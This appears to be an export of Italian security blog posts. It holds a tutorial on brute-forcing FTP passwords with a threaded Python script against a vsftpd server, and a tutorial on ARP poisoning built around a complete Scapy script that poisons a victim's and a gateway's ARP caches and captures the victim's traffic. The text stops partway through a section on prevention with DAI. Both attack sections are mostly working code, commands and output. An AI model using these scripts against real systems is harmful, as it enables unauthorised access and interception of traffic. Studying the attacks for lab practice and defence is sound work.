cartelle cancellare file  Il server risponde ogni volta con un codice di stato che serve a informare se il comando pu√≤ essere eseguito o meno con successo. Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All‚Äôepoca Internet era ancora molto piccolo e la cybercriminalit√† non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all‚Äôutilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.\nPerci√≤ sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.\nIl SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.\nAnche in questo caso la connessione √® criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso per√≤ bisogna utilizzare un programma aggiuntivo. Vsftpd (acronimo di Very Secure FTP daemon) √® un server FTP per sistemi simili a Unix, incluso Linux. √à il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. √à concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.\nOra che abbiamo compreso cos\u0026rsquo;√® il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.\nConfigurazione di un Server FTP con Vsftpd Il pacchetto vsftpd √® disponibile nei repository standard. Esegui i seguenti comandi per installarlo:\n$ sudo apt update $ sudo apt install vsftpd Al termine dell\u0026rsquo;installazione, il servizio ftp verr√† avviato automaticamente. Stampa lo stato del servizio per confermare:\n$ sudo systemctl status vsftpd √à possibile configurare il server vsftpd modificando il file /etc/vsftpd.conf. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili. Per iniziare, apri il file di configurazione vsftpd:\n$ sudo nano /etc/vsftpd.conf Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:\nanonymous_enable=NO local_enable=YES Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:\nsudo adduser newftpuser Impostare la password utente quando richiesto. Aggiungere l\u0026rsquo;utente all\u0026rsquo;elenco degli utenti FTP consentiti:\necho \u0026#34;newftpuser\u0026#34; | sudo tee -a /etc/vsftpd.user_list Crea l\u0026rsquo;albero della directory FTP e imposta le autorizzazioni corrette:\n$ sudo mkdir -p /home/newftpuser/ftp/upload $ sudo chmod 550 /home/newftpuser/ftp $ sudo chmod 750 /home/newftpuser/ftp/upload $ sudo chown -R newftpuser: /home/newftpuser/ftp Per il nostro fine vanno bene queste configurazioni, ma il file /etc/vsftpd.conf ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l\u0026rsquo;argomento.\nBrute Forcing delle credenziali di un server FTP con Python Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:\npip3 install colorama Inizia a scrivere il codice:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (Windows) # init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente \u0026ldquo;test\u0026rdquo;, e poi specifichiamo la porta dell\u0026rsquo;FTP, che √® la 21.\nOra scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:\ndef is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True Niente di speciale; inizializziamo l\u0026rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell\u0026rsquo;host e proviamo ad accedere, questo sollever√† un\u0026rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.\nUseremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l\u0026rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in \u0026ldquo;/usr/share/wordlists/nmap.lst\u0026rdquo;. Altrimenti, prendilo qui.\nUna volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:\n# read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) Ora tutto ci√≤ che dobbiamo fare √® eseguire la funzione di cui sopra su tutte queste password:\n# iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ora, questo codice va bene, ma √® molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.\nUsiamo i thread per accelerare questo processo; il seguente codice √® quello completo che utilizza il multi-threading:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Fantastico, √® abbastanza simile al precedente, ma qui stiamo usando una coda che all\u0026rsquo;inizio √® riempita con l\u0026rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password √® corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo √® cancellare la coda, ed √® quello che stiamo facendo.\nAbbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.\nEcco il codice completo:\nimport ftplib from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) init() # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def is_correct(password): # initialize the FTP server object server = ftplib.FTP() print(f\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials return False else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials:\u0026#34;, password, Fore.RESET) return True # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # iterate over passwords one by one # if the password is found, break out of the loop for password in passwords: if is_correct(password): break Ecco invece l‚Äôesempio pi√∫ complesso:\nimport ftplib from threading import Thread import queue from colorama import Fore, init # for fancy colors, nothing else # init the console for colors (for Windows) # init() # initialize the queue q = queue.Queue() # number of threads to spawn n_threads = 30 # hostname or IP address of the FTP server host = \u0026#34;192.168.1.113\u0026#34; # username of the FTP server, root as default for linux user = \u0026#34;test\u0026#34; # port of FTP, aka 21 port = 21 def connect_ftp(): global q while True: # get the password from the queue password = q.get() # initialize the FTP server object server = ftplib.FTP() print(\u0026#34;[!] Trying\u0026#34;, password) try: # tries to connect to FTP server with a timeout of 5 server.connect(host, port, timeout=5) # login using the credentials (user \u0026amp; password) server.login(user, password) except ftplib.error_perm: # login failed, wrong credentials pass else: # correct credentials print(f\u0026#34;{Fore.GREEN}[+] Found credentials: \u0026#34;) print(f\u0026#34;\\tHost: {host}\u0026#34;) print(f\u0026#34;\\tUser: {user}\u0026#34;) print(f\u0026#34;\\tPassword: {password}{Fore.RESET}\u0026#34;) # we found the password, let\u0026#39;s clear the queue with q.mutex: q.queue.clear() q.all_tasks_done.notify_all() q.unfinished_tasks = 0 finally: # notify the queue that the task is completed for this password q.task_done() # read the wordlist of passwords passwords = open(\u0026#34;wordlist.txt\u0026#34;).read().split(\u0026#34;\\n\u0026#34;) print(\u0026#34;[+] Passwords to try:\u0026#34;, len(passwords)) # put all passwords to the queue for password in passwords: q.put(password) # create `n_threads` that runs that function for t in range(n_threads): thread = Thread(target=connect_ftp) # will end when the main thread end thread.daemon = True thread.start() # wait for the queue to be empty q.join() Prova sul Campo Ora che abbiamo tutto, mettiamo alla prova le nostre conoscenze.\n Disclaimer: ‚ö†Ô∏è Quello che verr√† visto di seguito √® un esempio per il solo scopo educativo, violare sistemi informatici senza autorizzazione √® un reato, vi invito dunque a replicare quanto vedrete SOLO su sistemi di vostra propriet√†. ‚ö†Ô∏è\n Andiamo a installare vsftpd e inseriamo un nuovo utente. L\u0026rsquo;utente appena creato avr√† come credenziali:\n test : test\n Una volta creato l'utente test con la password test possiamo inserire le relative informazioni nello script, useremo il secondo essendo che sfrutta i thread, una volta inserito nello script lo username dell\u0026rsquo;utente che ci interessa e l\u0026rsquo;indirizzo IP della macchina avviamo il codice python con:\npython3 brute-ftp.py Nel mio caso sto eseguendo lo script su un portatile con Pop os e la macchina \u0026ldquo;vittima\u0026rdquo; √® una mcchina Ubuntu virtualizzata su VirtualBox. Una volta che lo script ha finito e riesce a trovare la password per l\u0026rsquo;utente test, questo √® l\u0026rsquo;output:\n[+] Passwords to try: 7 [!] Trying 123 [!] Trying aheq [!] Trying weeqe [!] Trying 9wee [!] Trying wewe [!] Trying 9002 [!] Trying test [+] Found credentials: Host: 192.168.1.242 User: test Password: test ","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/","tags":["Protocollo FTP","Brute Force","Python","vsftpd"],"title":"Brute Force di un Server FTP"},{"categories":["Tutorial","Network Attacks"],"contents":"Table Of Contents:\n Cos\u0026rsquo;√® il Protocollo ARP Che cos‚Äô√® l‚ÄôARP Poisoning ARP Poisoning con Scapy e Python Come prevenire L\u0026rsquo;ARP Poisoning con DAI   In questi giorni ho letto Python per Hacker (seconda edizione) e mi sono imbattuto durante la lettura in un argomento molto interessante, ossia l\u0026rsquo;ARP Poisoning.\nHo iniziato dunque a fare delle ricerche e voglio condividere quello che ho trovato con voi.\nCos\u0026rsquo;√® il Protocollo ARP Per approfondire l\u0026rsquo;argomento ti consigli di leggere questo.\nA differenza di quanto succede su Internet, i dispositivi presenti nella LAN non comunicano direttamente attraverso gli indirizzi IP, al loro posto, per l‚Äôindirizzamento nelle reti locali IPv4, vengono utilizzati gli indirizzi fisici dell‚Äôhardware, chiamati indirizzi MAC (Media Access Control). Gli indirizzi MAC vengono attribuiti dal rispettivo produttore hardware e sono unici al mondo. Teoricamente gli indirizzi hardware si adatterebbero quindi per consentire un indirizzamento globale, ma nella prassi questa concezione non si pu√≤ applicare, visto che gli indirizzi IPv4 sono troppo brevi per rappresentare in modo completo gli indirizzi MAC. Nelle reti basate su IPv4, la risoluzione dell‚Äôindirizzo tramite ARP √® perci√≤ indispensabile.\nSe ora un computer A volesse contattare un computer B nella stessa rete, per ottenere il suo indirizzo IP deve prima di tutto individuare l‚Äôindirizzo MAC appropriato. Cos√¨ entra in azione l‚ÄôAddress Resolution Protocol (ARP), un protocollo di rete che funziona secondo lo schema request-response. Ricercando l‚Äôindirizzo MAC giusto, il computer A invia prima di tutto una richiesta broadcast (chiamata richiesta ARP, in inglese ‚ÄúARP request‚Äù) a tutti i dispositivi in rete, questa richiesta comprende all‚Äôincirca le seguenti informazioni:\n Un computer con l\u0026rsquo;indirizzo MAC xx-xx-xx-xx-xx-xx e l\u0026rsquo;indirizzo IP yyy.yyy.yyy.yyy vorrebbe prendere contatto con un computer con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz e ha bisogno dell\u0026rsquo;indirizzo MAC giusto.\n La richiesta ARP viene accolta da tutti i computer nella LAN. Ogni computer in rete √® collegato a una tabella locale, detta cache ARP, per evitare che prima dell‚Äôinvio di ogni pacchetto debba venire fatta una richiesta ARP. Qui vengono salvati temporaneamente tutti gli indirizzi MAC conosciuti, comprensivi dell‚ÄôIP assegnato.\nTutti i computer nella rete annotano cos√¨ nella richiesta broadcast la coppia di indirizzo del mittente consegnato. Per√≤ ci si aspetta una risposta broadcast solo dal computer B, che invia un‚ÄôARP reply comprendente le seguenti informazioni:\n Qui il sistema con l\u0026rsquo;indirizzo IP zzz.zzz.zzz.zzz. L\u0026rsquo;indirizzo MAC ricercato √® aa-aa-aa-aa-aa-aa.\n Se un‚ÄôARP reply giunge al computer A, questo dispone di tutte le informazioni necessarie per inviare i pacchetti al computer B. Perci√≤ la comunicazione attraverso la rete locale non incontra nessun ostacolo.\nMa cosa succede se non √® il computer di destinazione ricercato a rispondere, bens√¨ un altro dispositivo che viene controllato da un hacker con intenti poco onorevoli? In questo caso entra in gioco l‚ÄôARP poisoning.\nOra che abbiamo chiarito il funzionamento del protocollo ARP, possiamo capire come un attaccante pu√≤ usare le falle del protocollo per i suoi scopi.\nChe cos‚Äô√® l‚ÄôARP Poisoning Lo schema request-response del protocollo ARP √® creato in modo tale che venga accettata e salvata la prima richiesta a un ARP request. Nel campo dell‚ÄôARP spoofing, gli hacker cercano perci√≤ di prevenire il reale computer di destinazione, di inviare un pacchetto di risposta con informazioni false e di manipolare cos√¨ la tabella ARP del computer richiedente, si parla quindi anche di ARP poisoning, perch√© si intende un ‚Äúavvelenamento‚Äù della cache ARP. Di solito il pacchetto comprende anche l‚Äôindirizzo MAC di un dispositivo di rete, controllato dall‚Äôhacker. Il sistema della vittima collega cos√¨ l‚ÄôIP di uscita con un indirizzo dell‚Äôhardware falso e in seguito invia, inosservato, tutti i pacchetti al sistema controllato dall‚Äôhacker, che ha cos√¨ la possibilit√† di rilevare tutto il traffico dati o di manipolarlo. Per rimanere nascosto, il traffico dati ascoltato viene solitamente inoltrato al sistema di destinazione reale. Un hacker ottiene cos√¨ con l‚Äôinganno lo status di man in the middle. Se i pacchetti intercettati non vengono inoltrati, bens√¨ rifiutati, l‚ÄôARP poisoning pu√≤ comportare un Denial of Service (DoS). Un‚Äôaltra strategia prevede che la rete venga continuamente bombardata da ARP reply false. La maggior parte dei sistemi ignorano i pacchetti di risposta che non possono attribuire a nessuna richiesta; per√≤ questo cambia non appena un computer avvia nella LAN una richiesta ARP e di conseguenza si ha l‚Äôintenzione di accettare una risposta. √à quindi una questione di timing, se al mittente arrivi prima la risposta del sistema di destinazione o di uno dei pacchetti falsi.\nARP Poisoning con Scapy e Python Dopo tutta questa prefazione teorica ora dobbiamo mettere le mani in pasta.\n Disclaimer: ‚ö†Ô∏è Quello che starete per vedere √® un esempio di attacco informatico che sto svolgendo su sistemi di mia propriet√†. Per chi fosse curioso di replicare quanto vede, consigli di farlo su sistemi di suo possesso, usare queste tecniche su sistemi informatici senza autorizzazione √® un illecito. ‚ö†Ô∏è\n Per questo attacco useremo una macchina Kali (macchina attaccante) e una macchina Pop-os (macchina target - vittima), rispettivamente su macchina virtuale e sul portatile.\nPer prima cosa controlleremo la configurazione di rete su Pop-os, il nostro bersaglio. Usiamo il comando:\nifconfig [interface] interface dovr√† essere sostituito con il nome dell‚Äôinterfaccia di rete della macchina vittima, nel mio caso l‚Äôinterfaccia √® wlp61s0, l‚Äôoutput dovr√† essere un qualcosa simile a:\nwlp61s0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.1.22 netmask 255.255.255.0 broadcast 192.168.1.255 inet6 fe80::bf57:5b8e:8ef6:fe0b prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether b4:6b:fc:a3:63:99 txqueuelen 1000 (Ethernet) RX packets 190150 bytes 230866258 (230.8 MB) RX errors 0 dropped 2237 overruns 0 frame 0 TX packets 52365 bytes 14313727 (14.3 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Il comando ifconfig ci mostra la configurazione della rete per un‚Äôinterfaccia specifica (in quest‚Äôesempio √® la wlp61s0) o per tutte le interfacce se non ne richiediamo una in particolare.\nL‚Äôoutput mostra che l‚Äôindirizzo inet (IPv4) per il dispositivo √® 192.168.1.22. √à mostrato anche l‚Äôindirizzo mac ether che √® b4:6b:fc:a3:63:99.\nOra vediamo la cache ARP della macchina vittima, usiamo il comando:\narp -a Il risultato √® qualcosa del tipo:\nwind3.hub (192.168.1.1) associato a b8:d5:26:69:b5:dc [ether] su wlp61s0 Kobra3390.wind3.hub (192.168.1.233) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 192.168.1.233 √® l‚Äôindirizzo IP della macchina Kali, mentre 192.168.1.1 √® l‚Äôindirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell‚Äôindirizzo MAC registrato per il gateway.\nConoscendo l‚Äôindirizzo IP dell‚Äôattaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): pass class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): pass def run(self): pass def poison(self): pass def sniff(self, count=200): pass def restore(self): pass if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Come si vede, definiamo una funzione helper per ottenere l‚Äô indirizzo MAC per una determinata macchina e una classe Arper per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione get_mac che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:\ndef get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None Le passiamo l‚Äôindirizzo IP dell‚Äôobiettivo e creiamo un pacchetto. La funzione Ether specifica che il pacchetto √® concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l‚Äôindirizzo MAC collegato chiedendo a ogni nodo della rete se √® in possesso di quell‚Äôindirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy srp che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile resp che dovrebbe contenere la sorgente Ether (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe Arper:\nclass Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l‚Äôinterfaccia che vogliamo utilizzare (eth0 √® l‚Äôopzione di default). Popoliamo le variabili interne dell‚Äôoggetto con interface, victim, victimmac, gateway e gatewaymac stampandone i valori a console.\nAll‚Äôinterno della classe Arper scriviamo la funzione run che rappresenta l‚Äôentry point del nostro attacco:\ndef run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) Il metodo run esegue tutto il lavoro principale dell‚Äôoggetto Arper. Imposta ed esegue due processi:\n Il primo avvelena la cache ARP Il secondo ci permette di osservare l‚Äôevoluzione dell‚Äôattacco sniffando il traffico di rete  Il metodo poison produce i pacchetti ‚Äúavvelenati‚Äù e li invia alla vittima e al gateway:\ndef poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) Il metodo poison imposta i dati che useremo per ‚Äúavvelenare‚Äù la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP poisoned per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l‚Äôindirizzo IP della vittima ma con il MAC dell‚Äôaggressore. Facciamo poi lo stesso inviando alla vittima l‚Äôindirizzo IP del gateway ma con il MAC address dell‚Äôaggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.\nPoi iniziamo a spedire i pacchetti ‚Äúavvelenati‚Äù alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell‚Äôattacco.\nPorremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da l√¨ ripristineremo la situazione riportandola alla normalit√†, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.\nPer vedere e registrare cosa succede durante le nostre operazioni di poisoning, intercettiamo il traffico di rete con il metodo sniff:\ndef sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) Il metodo sniff resta in pausa per cinque secondi prima di iniziare lo sniffing per dare tempo al thread che esegue il vero e proprio poisoning di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l‚Äôindirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo arper.pcap, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l‚Äôattacco.\nDa ultimo, il metodo restore riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:\ndef restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) Il metodo restore potrebbe essere chiamato sia da poison (dopo un CTRL-C), sia da sniff (quando il numero di pacchetti richiesti √® stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.\nEcco il codice completo:\nfrom multiprocessing import Process from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap) import os, sys, time def get_mac(targetip): packet = Ether(dst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;)/ARP(op=\u0026#34;who-has\u0026#34;, pdst=targetip) resp, _ = srp(packet, timeout=2, retry=10, verbose=False) for _, r in resp: return r[Ether].src return None class Arper: def __init__(self, victim, gateway, interface=\u0026#39;eth0\u0026#39;): self.victim = victim self.victimmac = get_mac(victim) self.gateway = gateway self.gatewaymac = get_mac(gateway) self.interface = interface conf.iface = interface conf.verb = 0 print(f\u0026#39;Initialized {interface}:\u0026#39;) print(f\u0026#39;Gateway ({gateway}) is at {self.gatewaymac}.\u0026#39;) print(f\u0026#39;Victim ({victim}) is at {self.victimmac}.\u0026#39;) print(\u0026#39;-\u0026#39; * 30) def run(self): self.poison_thread = Process(target=self.poison) self.poison_thread.start() self.sniff_thread = Process(target=self.sniff) self.sniff_thread.start() def poison(self): poison_victim = ARP() poison_victim.op = 2 poison_victim.psrc = self.gateway poison_victim.pdst = self.victim poison_victim.hwdst = self.victimmac print(f\u0026#39;ip src: {poison_victim.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_victim.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_victim.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_victim.hwsrc}\u0026#39;) print(poison_victim.summary()) print(f\u0026#39;-\u0026#39; * 30) poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = self.victim poison_gateway.pdst = self.gateway poison_gateway.hwdst = self.gatewaymac print(f\u0026#39;ip src: {poison_gateway.psrc}\u0026#39;) print(f\u0026#39;ip dst: {poison_gateway.pdst}\u0026#39;) print(f\u0026#39;mac dst: {poison_gateway.hwdst}\u0026#39;) print(f\u0026#39;mac src: {poison_gateway.hwsrc}\u0026#39;) print(poison_gateway.summary()) print(f\u0026#39;-\u0026#39; * 30) print(f\u0026#39;Beginning the ARP poison. [CTRL-C to stop]\u0026#39;) while True: sys.stdout.write(\u0026#39;.\u0026#39;) sys.stdout.flush() try: send(poison_victim) send(poison_gateway) except KeyboardInterrupt: self.restore() sys.exit() else: time.sleep(2) def sniff(self, count=100): time.sleep(5) print(f\u0026#39;Sniffing {count}packets\u0026#39;) bpf_filter = \u0026#34;ip host %s\u0026#34; % victim packets = sniff(count=count, filter=bpf_filter, iface=self.interface) wrpcap(\u0026#39;arper.pcap\u0026#39;, packets) print(\u0026#39;Got the packets\u0026#39;) self.restrore() self.poison_thread.terminate() print(\u0026#39;Finished.\u0026#39;) def restrore(self): print(\u0026#39;Restoring ARP Tables...\u0026#39;) send(ARP( op=2, psrc=self.gateway, hwsrc=self.gatewaymac, pdst=self.victim, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) send(ARP( op=2, psrc=self.victim, hwsrc=self.victimmac, pdst=self.gateway, hwdst=\u0026#39;ff:ff:ff:ff:ff:ff\u0026#39;), count=5) if __name__ == \u0026#34;__main__\u0026#34;: (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3]) myarp = Arper(victim, gateway, interface) myarp.run() Prima di avviare l‚Äôattacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:\nsudo echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Ora che l‚ÄôIP forwarding √® stato importato, avviamo lo script con:\nsudo python3 arper.py [IP vittima] [IP gateway] [interface] Ad esempio:\nsudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0 L‚Äôoutput durante l‚Äôattacco:\n? (192.168.1.1) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 ? (192.168.1.176) associato a 18:cc:18:fa:ad:b1 [ether] su wlp61s0 Si vede che la vittima malcapitata ha una cache ARP compromessa, poich√® il gateway risulta avere lo stesso indirizzo MAC dell‚Äôattaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.\nCome prevenire L\u0026rsquo;ARP Poisoning con DAI L\u0026rsquo;ispezione ARP dinamica (DAI) √® una funzione di sicurezza che rifiuta i pacchetti ARP non validi e dannosi. La funzione impedisce una classe di attacchi man-in-the-middle, in cui una stazione ostile intercetta il traffico per altre stazioni avvelenando le cache ARP dei suoi ignari vicini. Il malintenzionato invia richieste o risposte ARP mappando 